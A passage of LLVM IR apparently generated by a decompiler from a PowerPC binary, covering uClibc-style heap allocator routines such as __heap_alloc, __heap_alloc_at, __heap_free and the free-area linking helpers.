  %v0_1000c794 = load i32, i32* @r29, align 4
  store i32 %v0_1000c794, i32* @r3, align 4
  store i32 268486556, i32* @lr, align 4
  %v0_1000c798 = call i32 @pthread_mutex_unlock()
  %v0_1000c79c = load i32, i32* @r27, align 4
  %v3_1000c79c = icmp eq i32 %v0_1000c79c, 0
  br i1 %v3_1000c79c, label %dec_label_pc_1000c7b0, label %dec_label_pc_1000c7a4

dec_label_pc_1000c7a4:                            ; preds = %dec_label_pc_1000c76c
  %v0_1000c7a4 = load i32, i32* @r30, align 4
  %v2_1000c7a4 = add i32 %v0_1000c7a4, %v0_1000c79c
  %v1_1000c7a8 = load i32, i32* @r28, align 4
  %v2_1000c7a8 = add i32 %v1_1000c7a8, -4
  %v3_1000c7a8 = inttoptr i32 %v2_1000c7a8 to i32*
  store i32 %v2_1000c7a4, i32* %v3_1000c7a8, align 4
  br label %dec_label_pc_1000c820

dec_label_pc_1000c7b0:                            ; preds = %dec_label_pc_1000c76c
  %v0_1000c7b0 = load i32, i32* @r31, align 4
  %v1_1000c7b0 = add i32 %v0_1000c7b0, -4
  store i32 %v1_1000c7b0, i32* @r3, align 4
  store i32 268486584, i32* @lr, align 4
  %v0_1000c7b4 = call i32 @malloc()
  store i32 %v0_1000c7b4, i32* @r3, align 4
  store i32 %v0_1000c7b4, i32* @r31, align 4
  %v3_1000c7b8 = icmp eq i32 %v0_1000c7b4, 0
  br i1 %v3_1000c7b8, label %dec_label_pc_1000c7c0, label %dec_label_pc_1000c7c8

dec_label_pc_1000c7c0:                            ; preds = %dec_label_pc_1000c7b0
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000c820

dec_label_pc_1000c7c8:                            ; preds = %dec_label_pc_1000c7b0
  %v0_1000c7c8 = load i32, i32* @r28, align 4
  store i32 %v0_1000c7c8, i32* @r4, align 4
  %v0_1000c7cc = load i32, i32* @r30, align 4
  %v1_1000c7cc = add i32 %v0_1000c7cc, -4
  store i32 %v1_1000c7cc, i32* @r5, align 4
  store i32 268486612, i32* @lr, align 4
  %v0_1000c7d0 = call i32 @memcpy()
  %v0_1000c7d4 = load i32, i32* @r28, align 4
  store i32 %v0_1000c7d4, i32* @r3, align 4
  store i32 268486620, i32* @lr, align 4
  %v0_1000c7d8 = call i32 @free()
  %v0_1000c7dc = load i32, i32* @r31, align 4
  store i32 %v0_1000c7dc, i32* @r28, align 4
  br label %dec_label_pc_1000c820

dec_label_pc_1000c7e4:                            ; preds = %dec_label_pc_1000c764
  %v1_1000c7e4 = add i32 %v0_1000c7e4, 28
  %v3_1000c7e8 = icmp ugt i32 %v1_1000c7e4, %v3_1000c754
  br i1 %v3_1000c7e8, label %dec_label_pc_1000c820, label %dec_label_pc_1000c7f0

dec_label_pc_1000c7f0:                            ; preds = %dec_label_pc_1000c7e4
  store i32 ptrtoint (i32* @global_var_10030b4c.114 to i32), i32* @r29, align 4
  store i32 268486656, i32* @lr, align 4
  %v1_1000c7fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030b4c.114 to i32))
  %v0_1000c804 = load i32, i32* @r27, align 4
  %v1_1000c804 = load i32, i32* @r31, align 4
  %v2_1000c804 = add i32 %v1_1000c804, %v0_1000c804
  %v1_1000c808 = load i32, i32* @r30, align 4
  %v2_1000c808 = sub i32 %v1_1000c808, %v1_1000c804
  store i32 268486676, i32* @lr, align 4
  %v4_1000c810 = call i32 @__heap_free(i32* nonnull @global_var_1002c2c4, i32 %v2_1000c804, i32 %v2_1000c808)
  %v0_1000c814 = load i32, i32* @r29, align 4
  store i32 %v0_1000c814, i32* @r3, align 4
  store i32 268486684, i32* @lr, align 4
  %v0_1000c818 = call i32 @pthread_mutex_unlock()
  %v0_1000c81c = load i32, i32* @r31, align 4
  %v1_1000c81c = load i32, i32* @r28, align 4
  %v2_1000c81c = add i32 %v1_1000c81c, -4
  %v3_1000c81c = inttoptr i32 %v2_1000c81c to i32*
  store i32 %v0_1000c81c, i32* %v3_1000c81c, align 4
  br label %dec_label_pc_1000c820

dec_label_pc_1000c820:                            ; preds = %dec_label_pc_1000c7e4, %dec_label_pc_1000c7c8, %dec_label_pc_1000c7c0, %dec_label_pc_1000c7a4, %dec_label_pc_1000c73c, %dec_label_pc_1000c7f0
  %v0_1000c824 = load i32, i32* @r28, align 4
  ret i32 %v0_1000c824

; uselistorder directives
  uselistorder i32 %v1_1000c804, { 1, 0 }
  uselistorder i32 %v1_1000c780, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32* @global_var_1002c2c4, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10030b4c.114 to i32), { 0, 6, 1, 7, 8, 2, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000c820, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000c764, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000c838 = inttoptr i32 %arg2 to i32*
  %v2_1000c838 = load i32, i32* %v1_1000c838, align 4
  %v1_1000c83c = add i32 %v2_1000c838, 3
  %v1_1000c840 = call i32 @__asm_rlwinm(i32 %v1_1000c83c, i32 0, i32 0, i32 29)
  %v2_1000c844 = icmp ugt i32 %v1_1000c840, 11
  br i1 %v2_1000c844, label %dec_label_pc_1000c8c8.preheader, label %dec_label_pc_1000c84c

dec_label_pc_1000c84c:                            ; preds = %entry
  br label %dec_label_pc_1000c8c8.preheader

dec_label_pc_1000c8c8.preheader:                  ; preds = %entry, %dec_label_pc_1000c84c
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000c84c ], [ %v1_1000c840, %entry ]
  %v0_1000c8ac = phi i32 [ 12, %dec_label_pc_1000c84c ], [ %v1_1000c840, %entry ]
  store i32 %storemerge20, i32* @r11, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* @r9, align 4
  %v3_1000c8c85 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000c8c85, label %dec_label_pc_1000c8d0, label %dec_label_pc_1000c858

dec_label_pc_1000c858:                            ; preds = %dec_label_pc_1000c8c8.preheader, %dec_label_pc_1000c8c4
  %v0_1000c8c4 = phi i32 [ %storemerge, %dec_label_pc_1000c8c4 ], [ %storemerge2, %dec_label_pc_1000c8c8.preheader ]
  %v1_1000c858 = inttoptr i32 %v0_1000c8c4 to i32*
  %v2_1000c858 = load i32, i32* %v1_1000c858, align 4
  store i32 %v2_1000c858, i32* @r10, align 4
  %v2_1000c85c = icmp ult i32 %v2_1000c858, %v0_1000c8ac
  br i1 %v2_1000c85c, label %dec_label_pc_1000c8c4, label %dec_label_pc_1000c864

dec_label_pc_1000c864:                            ; preds = %dec_label_pc_1000c858
  %v1_1000c864 = add i32 %v0_1000c8ac, 44
  %v2_1000c868 = icmp ult i32 %v2_1000c858, %v1_1000c864
  br i1 %v2_1000c868, label %dec_label_pc_1000c870, label %dec_label_pc_1000c8ac

dec_label_pc_1000c870:                            ; preds = %dec_label_pc_1000c864
  %v1_1000c870 = add i32 %v0_1000c8c4, 4
  %v2_1000c870 = inttoptr i32 %v1_1000c870 to i32*
  %v3_1000c870 = load i32, i32* %v2_1000c870, align 4
  %v3_1000c874 = icmp eq i32 %v3_1000c870, 0
  br i1 %v3_1000c874, label %dec_label_pc_1000c884, label %dec_label_pc_1000c87c

dec_label_pc_1000c87c:                            ; preds = %dec_label_pc_1000c870
  %v1_1000c87c = add i32 %v0_1000c8c4, 8
  %v2_1000c87c = inttoptr i32 %v1_1000c87c to i32*
  %v3_1000c87c = load i32, i32* %v2_1000c87c, align 4
  %v2_1000c880 = add i32 %v3_1000c870, 8
  %v3_1000c880 = inttoptr i32 %v2_1000c880 to i32*
  store i32 %v3_1000c87c, i32* %v3_1000c880, align 4
  %v0_1000c884.pre = load i32, i32* @r9, align 4
  %v0_1000c8a0.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1000c884

dec_label_pc_1000c884:                            ; preds = %dec_label_pc_1000c870, %dec_label_pc_1000c87c
  %v0_1000c8a0 = phi i32 [ %v2_1000c858, %dec_label_pc_1000c870 ], [ %v0_1000c8a0.pre, %dec_label_pc_1000c87c ]
  %v0_1000c884 = phi i32 [ %v0_1000c8c4, %dec_label_pc_1000c870 ], [ %v0_1000c884.pre, %dec_label_pc_1000c87c ]
  %v1_1000c884 = add i32 %v0_1000c884, 8
  %v2_1000c884 = inttoptr i32 %v1_1000c884 to i32*
  %v3_1000c884 = load i32, i32* %v2_1000c884, align 4
  store i32 %v3_1000c884, i32* @r8, align 4
  %v1_1000c888 = add i32 %v0_1000c884, 4
  %v2_1000c888 = inttoptr i32 %v1_1000c888 to i32*
  %v3_1000c888 = load i32, i32* %v2_1000c888, align 4
  %v3_1000c88c = icmp eq i32 %v3_1000c884, 0
  store i32 %v0_1000c8a0, i32* @r11, align 4
  br i1 %v3_1000c88c, label %dec_label_pc_1000c8a0, label %dec_label_pc_1000c894

dec_label_pc_1000c894:                            ; preds = %dec_label_pc_1000c884
  %v2_1000c898 = add i32 %v3_1000c884, 4
  %v3_1000c898 = inttoptr i32 %v2_1000c898 to i32*
  store i32 %v3_1000c888, i32* %v3_1000c898, align 4
  br label %dec_label_pc_1000c8b4

dec_label_pc_1000c8a0:                            ; preds = %dec_label_pc_1000c884
  store i32 %v3_1000c888, i32* %arg1, align 4
  br label %dec_label_pc_1000c8b4

dec_label_pc_1000c8ac:                            ; preds = %dec_label_pc_1000c864
  %v2_1000c8ac = sub i32 %v2_1000c858, %v0_1000c8ac
  store i32 %v2_1000c8ac, i32* %v1_1000c858, align 4
  br label %dec_label_pc_1000c8b4

dec_label_pc_1000c8b4:                            ; preds = %dec_label_pc_1000c8a0, %dec_label_pc_1000c894, %dec_label_pc_1000c8ac
  %v0_1000c8b4 = load i32, i32* @r10, align 4
  %v1_1000c8b4 = load i32, i32* @r9, align 4
  %v2_1000c8b4 = sub i32 %v1_1000c8b4, %v0_1000c8b4
  store i32 %v2_1000c8b4, i32* @r9, align 4
  %v0_1000c8b8 = load i32, i32* @r11, align 4
  store i32 %v0_1000c8b8, i32* %v1_1000c838, align 4
  %v0_1000c8bc = load i32, i32* @r9, align 4
  %v1_1000c8bc = add i32 %v0_1000c8bc, 12
  ret i32 %v1_1000c8bc

dec_label_pc_1000c8c4:                            ; preds = %dec_label_pc_1000c858
  %v1_1000c8c4 = add i32 %v0_1000c8c4, 4
  %storemerge.in = inttoptr i32 %v1_1000c8c4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r9, align 4
  %v3_1000c8c8 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000c8c8, label %dec_label_pc_1000c8c8.dec_label_pc_1000c8d0_crit_edge, label %dec_label_pc_1000c858

dec_label_pc_1000c8c8.dec_label_pc_1000c8d0_crit_edge: ; preds = %dec_label_pc_1000c8c4
  br label %dec_label_pc_1000c8d0

dec_label_pc_1000c8d0:                            ; preds = %dec_label_pc_1000c8c8.dec_label_pc_1000c8d0_crit_edge, %dec_label_pc_1000c8c8.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000c884, { 1, 0 }
  uselistorder i32 %v2_1000c858, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000c8c4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000c8ac, { 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c884, { 1, 0 }
  uselistorder label %dec_label_pc_1000c858, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8c8.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000c8d8 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c8d8, i32* @r11, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_1000c8e0 = add i32 %arg3, 3
  %v3_1000c9643 = icmp eq i32 %v2_1000c8d8, 0
  br i1 %v3_1000c9643, label %dec_label_pc_1000c96c, label %dec_label_pc_1000c8e8

dec_label_pc_1000c8e8:                            ; preds = %entry, %dec_label_pc_1000c960
  %v0_1000c960 = phi i32 [ %v3_1000c960, %dec_label_pc_1000c960 ], [ %v2_1000c8d8, %entry ]
  %v1_1000c8e8 = inttoptr i32 %v0_1000c960 to i32*
  %v2_1000c8e8 = load i32, i32* %v1_1000c8e8, align 4
  %v2_1000c8ec = sub i32 %v0_1000c960, %v2_1000c8e8
  %v1_1000c8f0 = add i32 %v2_1000c8ec, 12
  store i32 %v1_1000c8f0, i32* @r9, align 4
  %v3_1000c8f4 = icmp ugt i32 %v1_1000c8f0, %arg2
  br i1 %v3_1000c8f4, label %dec_label_pc_1000c960, label %dec_label_pc_1000c8fc

dec_label_pc_1000c8fc:                            ; preds = %dec_label_pc_1000c8e8
  %v4_1000c8f4 = icmp eq i32 %v1_1000c8f0, %arg2
  br i1 %v4_1000c8f4, label %dec_label_pc_1000c904, label %dec_label_pc_1000c96c

dec_label_pc_1000c904:                            ; preds = %dec_label_pc_1000c8fc
  %v1_1000c904 = call i32 @__asm_rlwinm(i32 %v1_1000c8e0, i32 0, i32 0, i32 29)
  %v2_1000c908 = icmp ult i32 %v2_1000c8e8, %v1_1000c904
  br i1 %v2_1000c908, label %dec_label_pc_1000c96c, label %dec_label_pc_1000c910

dec_label_pc_1000c910:                            ; preds = %dec_label_pc_1000c904
  %v1_1000c910 = add i32 %v1_1000c904, 44
  %v2_1000c914 = icmp ult i32 %v2_1000c8e8, %v1_1000c910
  br i1 %v2_1000c914, label %dec_label_pc_1000c91c, label %dec_label_pc_1000c950

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c910
  %v0_1000c91c = load i32, i32* @r11, align 4
  %v1_1000c91c = add i32 %v0_1000c91c, 4
  %v2_1000c91c = inttoptr i32 %v1_1000c91c to i32*
  %v3_1000c91c = load i32, i32* %v2_1000c91c, align 4
  %v3_1000c920 = icmp eq i32 %v3_1000c91c, 0
  br i1 %v3_1000c920, label %dec_label_pc_1000c930, label %dec_label_pc_1000c928

dec_label_pc_1000c928:                            ; preds = %dec_label_pc_1000c91c
  %v1_1000c928 = add i32 %v0_1000c91c, 8
  %v2_1000c928 = inttoptr i32 %v1_1000c928 to i32*
  %v3_1000c928 = load i32, i32* %v2_1000c928, align 4
  %v2_1000c92c = add i32 %v3_1000c91c, 8
  %v3_1000c92c = inttoptr i32 %v2_1000c92c to i32*
  store i32 %v3_1000c928, i32* %v3_1000c92c, align 4
  %v0_1000c930.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000c930

dec_label_pc_1000c930:                            ; preds = %dec_label_pc_1000c91c, %dec_label_pc_1000c928
  %v0_1000c930 = phi i32 [ %v0_1000c91c, %dec_label_pc_1000c91c ], [ %v0_1000c930.pre, %dec_label_pc_1000c928 ]
  %v1_1000c930 = add i32 %v0_1000c930, 8
  %v2_1000c930 = inttoptr i32 %v1_1000c930 to i32*
  %v3_1000c930 = load i32, i32* %v2_1000c930, align 4
  store i32 %v3_1000c930, i32* @r10, align 4
  %v1_1000c934 = add i32 %v0_1000c930, 4
  %v2_1000c934 = inttoptr i32 %v1_1000c934 to i32*
  %v3_1000c934 = load i32, i32* %v2_1000c934, align 4
  store i32 %v3_1000c934, i32* @r9, align 4
  %v3_1000c938 = icmp eq i32 %v3_1000c930, 0
  br i1 %v3_1000c938, label %dec_label_pc_1000c948, label %dec_label_pc_1000c940

dec_label_pc_1000c940:                            ; preds = %dec_label_pc_1000c930
  %v2_1000c940 = add i32 %v3_1000c930, 4
  %v3_1000c940 = inttoptr i32 %v2_1000c940 to i32*
  store i32 %v3_1000c934, i32* %v3_1000c940, align 4
  ret i32 %v2_1000c8e8

dec_label_pc_1000c948:                            ; preds = %dec_label_pc_1000c930
  %v1_1000c948 = load i32, i32* @r8, align 4
  %v2_1000c948 = inttoptr i32 %v1_1000c948 to i32*
  store i32 %v3_1000c934, i32* %v2_1000c948, align 4
  ret i32 %v2_1000c8e8

dec_label_pc_1000c950:                            ; preds = %dec_label_pc_1000c910
  %v2_1000c950 = sub i32 %v2_1000c8e8, %v1_1000c904
  %v1_1000c958 = load i32, i32* @r11, align 4
  %v2_1000c958 = inttoptr i32 %v1_1000c958 to i32*
  store i32 %v2_1000c950, i32* %v2_1000c958, align 4
  ret i32 %v1_1000c904

dec_label_pc_1000c960:                            ; preds = %dec_label_pc_1000c8e8
  %v1_1000c960 = add i32 %v0_1000c960, 4
  %v2_1000c960 = inttoptr i32 %v1_1000c960 to i32*
  %v3_1000c960 = load i32, i32* %v2_1000c960, align 4
  store i32 %v3_1000c960, i32* @r11, align 4
  %v3_1000c964 = icmp eq i32 %v3_1000c960, 0
  br i1 %v3_1000c964, label %dec_label_pc_1000c964.dec_label_pc_1000c96c.loopexit_crit_edge, label %dec_label_pc_1000c8e8

dec_label_pc_1000c964.dec_label_pc_1000c96c.loopexit_crit_edge: ; preds = %dec_label_pc_1000c960
  br label %dec_label_pc_1000c96c

dec_label_pc_1000c96c:                            ; preds = %entry, %dec_label_pc_1000c964.dec_label_pc_1000c96c.loopexit_crit_edge, %dec_label_pc_1000c8fc, %dec_label_pc_1000c904
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000c960, { 1, 2, 0 }
  uselistorder i32 %v0_1000c930, { 1, 0 }
  uselistorder i32 %v1_1000c904, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000c8e8, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %v0_1000c960, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000c96c, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000c930, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8e8, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000c974 = icmp eq i32 %arg3, 0
  %v2_1000c978 = add i32 %arg2, 4
  %v3_1000c978 = inttoptr i32 %v2_1000c978 to i32*
  store i32 %arg4, i32* %v3_1000c978, align 4
  %v2_1000c97c = add i32 %arg2, 8
  %v3_1000c97c = inttoptr i32 %v2_1000c97c to i32*
  store i32 %arg3, i32* %v3_1000c97c, align 4
  br i1 %v3_1000c974, label %dec_label_pc_1000c98c, label %dec_label_pc_1000c984

dec_label_pc_1000c984:                            ; preds = %entry
  %v2_1000c984 = add i32 %arg3, 4
  %v3_1000c984 = inttoptr i32 %v2_1000c984 to i32*
  store i32 %arg2, i32* %v3_1000c984, align 4
  br label %dec_label_pc_1000c990

dec_label_pc_1000c98c:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000c990

dec_label_pc_1000c990:                            ; preds = %dec_label_pc_1000c984, %dec_label_pc_1000c98c
  %v3_1000c990 = icmp eq i32 %arg4, 0
  %v0_1000c994 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000c990, i32 %v0_1000c994)
  %v2_1000c998 = add i32 %arg4, 8
  %v3_1000c998 = inttoptr i32 %v2_1000c998 to i32*
  store i32 %arg2, i32* %v3_1000c998, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 4, 3 }
  uselistorder label %dec_label_pc_1000c990, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000c9a0 = icmp eq i32 %arg3, 0
  br i1 %v3_1000c9a0, label %dec_label_pc_1000c9b0, label %dec_label_pc_1000c9a8

dec_label_pc_1000c9a8:                            ; preds = %entry
  %v2_1000c9a8 = add i32 %arg3, 4
  %v3_1000c9a8 = inttoptr i32 %v2_1000c9a8 to i32*
  store i32 %arg2, i32* %v3_1000c9a8, align 4
  br label %dec_label_pc_1000c9b4

dec_label_pc_1000c9b0:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000c9b4

dec_label_pc_1000c9b4:                            ; preds = %dec_label_pc_1000c9a8, %dec_label_pc_1000c9b0
  %v2_1000c9b4 = add i32 %arg2, 8
  %v3_1000c9b4 = inttoptr i32 %v2_1000c9b4 to i32*
  store i32 %arg3, i32* %v3_1000c9b4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c9b4, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r10, align 4
  store i32 0, i32* @r11, align 4
  %v2_1000c9d4 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c9d4, i32* @r31, align 4
  %v2_1000c9d8 = add i32 %arg3, %arg2
  store i32 %v2_1000c9d8, i32* %r3.global-to-local, align 4
  %v3_1000c9ec7 = icmp eq i32 %v2_1000c9d4, 0
  %v1_1000c9f08 = add i32 %v2_1000c9d4, 12
  %tmp69 = icmp uge i32 %v1_1000c9f08, %arg2
  %or.cond10 = or i1 %v3_1000c9ec7, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000c9fc, label %dec_label_pc_1000c9e4

dec_label_pc_1000c9e4:                            ; preds = %entry, %dec_label_pc_1000c9e4
  %v0_1000ca4411 = phi i32 [ %v3_1000c9e8, %dec_label_pc_1000c9e4 ], [ %v2_1000c9d4, %entry ]
  store i32 %v0_1000ca4411, i32* @r11, align 4
  %v1_1000c9e8 = add i32 %v0_1000ca4411, 4
  %v2_1000c9e8 = inttoptr i32 %v1_1000c9e8 to i32*
  %v3_1000c9e8 = load i32, i32* %v2_1000c9e8, align 4
  store i32 %v3_1000c9e8, i32* @r31, align 4
  %v3_1000c9ec = icmp eq i32 %v3_1000c9e8, 0
  %v1_1000c9f0 = add i32 %v3_1000c9e8, 12
  %tmp6 = icmp uge i32 %v1_1000c9f0, %arg2
  %or.cond = or i1 %v3_1000c9ec, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000c9fc, label %dec_label_pc_1000c9e4

dec_label_pc_1000c9fc:                            ; preds = %dec_label_pc_1000c9e4, %entry
  %v0_1000ca38.lcssa = phi i32 [ 0, %entry ], [ %v0_1000ca4411, %dec_label_pc_1000c9e4 ]
  %v0_1000ca44.lcssa = phi i32 [ %v2_1000c9d4, %entry ], [ %v3_1000c9e8, %dec_label_pc_1000c9e4 ]
  %v3_1000c9ec.lcssa = phi i1 [ %v3_1000c9ec7, %entry ], [ %v3_1000c9ec, %dec_label_pc_1000c9e4 ]
  br i1 %v3_1000c9ec.lcssa, label %dec_label_pc_1000cab4, label %dec_label_pc_1000ca04

dec_label_pc_1000ca04:                            ; preds = %dec_label_pc_1000c9fc
  %v1_1000ca04 = inttoptr i32 %v0_1000ca44.lcssa to i32*
  %v2_1000ca04 = load i32, i32* %v1_1000ca04, align 4
  %v2_1000ca08 = sub i32 %v0_1000ca44.lcssa, %v2_1000ca04
  %v1_1000ca0c = add i32 %v2_1000ca08, 12
  store i32 %v1_1000ca0c, i32* @r9, align 4
  %v3_1000ca10 = icmp ugt i32 %v1_1000ca0c, %v2_1000c9d8
  br i1 %v3_1000ca10, label %dec_label_pc_1000cab4, label %dec_label_pc_1000ca18

dec_label_pc_1000ca18:                            ; preds = %dec_label_pc_1000ca04
  %v4_1000ca10 = icmp eq i32 %v1_1000ca0c, %v2_1000c9d8
  %v2_1000ca1c = add i32 %v2_1000ca04, %arg3
  store i32 %v2_1000ca1c, i32* @r29, align 4
  br i1 %v4_1000ca10, label %dec_label_pc_1000ca24, label %dec_label_pc_1000ca54

dec_label_pc_1000ca24:                            ; preds = %dec_label_pc_1000ca18
  %v3_1000ca24 = icmp eq i32 %v0_1000ca38.lcssa, 0
  br i1 %v3_1000ca24, label %dec_label_pc_1000caa8, label %dec_label_pc_1000ca2c

dec_label_pc_1000ca2c:                            ; preds = %dec_label_pc_1000ca24
  %v1_1000ca2c = add i32 %v0_1000ca38.lcssa, 12
  %v4_1000ca30 = icmp eq i32 %v1_1000ca2c, %arg2
  br i1 %v4_1000ca30, label %dec_label_pc_1000ca38, label %dec_label_pc_1000caa8

dec_label_pc_1000ca38:                            ; preds = %dec_label_pc_1000ca2c
  %v1_1000ca38 = inttoptr i32 %v0_1000ca38.lcssa to i32*
  %v2_1000ca38 = load i32, i32* %v1_1000ca38, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000ca40 = add i32 %v0_1000ca38.lcssa, 8
  %v2_1000ca40 = inttoptr i32 %v1_1000ca40 to i32*
  %v3_1000ca40 = load i32, i32* %v2_1000ca40, align 4
  %v2_1000ca48 = add i32 %v2_1000ca38, %v2_1000ca1c
  store i32 %v2_1000ca48, i32* @r29, align 4
  %v5_1000ca4c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000ca44.lcssa, i32 %v3_1000ca40, i32 %v2_1000c9d8)
  store i32 %v5_1000ca4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000caa8

dec_label_pc_1000ca54:                            ; preds = %dec_label_pc_1000ca18
  %v1_1000ca54 = add i32 %v0_1000ca44.lcssa, 4
  %v2_1000ca54 = inttoptr i32 %v1_1000ca54 to i32*
  %v3_1000ca54 = load i32, i32* %v2_1000ca54, align 4
  %v3_1000ca58 = icmp eq i32 %v3_1000ca54, 0
  br i1 %v3_1000ca58, label %dec_label_pc_1000ca90, label %dec_label_pc_1000ca60

dec_label_pc_1000ca60:                            ; preds = %dec_label_pc_1000ca54
  %v1_1000ca60 = inttoptr i32 %v3_1000ca54 to i32*
  %v2_1000ca60 = load i32, i32* %v1_1000ca60, align 4
  %v2_1000ca64 = sub i32 %v3_1000ca54, %v2_1000ca60
  %v1_1000ca68 = add i32 %v2_1000ca64, 12
  store i32 %v1_1000ca68, i32* @r9, align 4
  %v4_1000ca6c = icmp eq i32 %v2_1000c9d8, %v1_1000ca68
  br i1 %v4_1000ca6c, label %dec_label_pc_1000ca74, label %dec_label_pc_1000ca90

dec_label_pc_1000ca74:                            ; preds = %dec_label_pc_1000ca60
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000ca80 = add i32 %v2_1000ca60, %v2_1000ca1c
  store i32 %v2_1000ca80, i32* @r29, align 4
  store i32 %v3_1000ca54, i32* @r31, align 4
  %v5_1000ca88 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000ca54, i32 %v0_1000ca38.lcssa, i32 %v2_1000c9d8)
  store i32 %v5_1000ca88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000caa8

dec_label_pc_1000ca90:                            ; preds = %dec_label_pc_1000ca60, %dec_label_pc_1000ca54
  %v2_1000ca90 = add i32 %v0_1000ca44.lcssa, %arg3
  store i32 %v2_1000ca90, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268487336, i32* @lr, align 4
  %v5_1000caa4 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000ca90, i32 %v0_1000ca38.lcssa, i32 %v3_1000ca54)
  store i32 %v5_1000caa4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000caa8

dec_label_pc_1000caa8:                            ; preds = %dec_label_pc_1000ca2c, %dec_label_pc_1000ca24, %dec_label_pc_1000ca74, %dec_label_pc_1000ca38, %dec_label_pc_1000ca90
  %v0_1000caa8 = load i32, i32* @r31, align 4
  store i32 %v0_1000caa8, i32* @r30, align 4
  %v0_1000caac = load i32, i32* @r29, align 4
  %v2_1000caac = inttoptr i32 %v0_1000caa8 to i32*
  store i32 %v0_1000caac, i32* %v2_1000caac, align 4
  br label %dec_label_pc_1000cad0

dec_label_pc_1000cab4:                            ; preds = %dec_label_pc_1000ca04, %dec_label_pc_1000c9fc
  %v2_1000cab4 = add i32 %v2_1000c9d8, -12
  %v3_1000cab4 = inttoptr i32 %v2_1000cab4 to i32*
  store i32 %arg3, i32* %v3_1000cab4, align 4
  %v0_1000cab8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000cab8 = add i32 %v0_1000cab8, -12
  store i32 %v1_1000cab8, i32* @r30, align 4
  %v0_1000cabc = load i32, i32* @r11, align 4
  %v0_1000cac0 = load i32, i32* @r10, align 4
  store i32 %v0_1000cac0, i32* %r3.global-to-local, align 4
  %v0_1000cac4 = load i32, i32* @r31, align 4
  store i32 268487376, i32* @lr, align 4
  %v4_1000cacc = inttoptr i32 %v0_1000cac0 to i32*
  %v5_1000cacc = call i32 @__heap_link_free_area(i32* %v4_1000cacc, i32 %v1_1000cab8, i32 %v0_1000cabc, i32 %v0_1000cac4)
  store i32 %v5_1000cacc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cad0

dec_label_pc_1000cad0:                            ; preds = %dec_label_pc_1000caa8, %dec_label_pc_1000cab4
  %v0_1000cad4 = load i32, i32* @r30, align 4
  store i32 %v0_1000cad4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000cad4
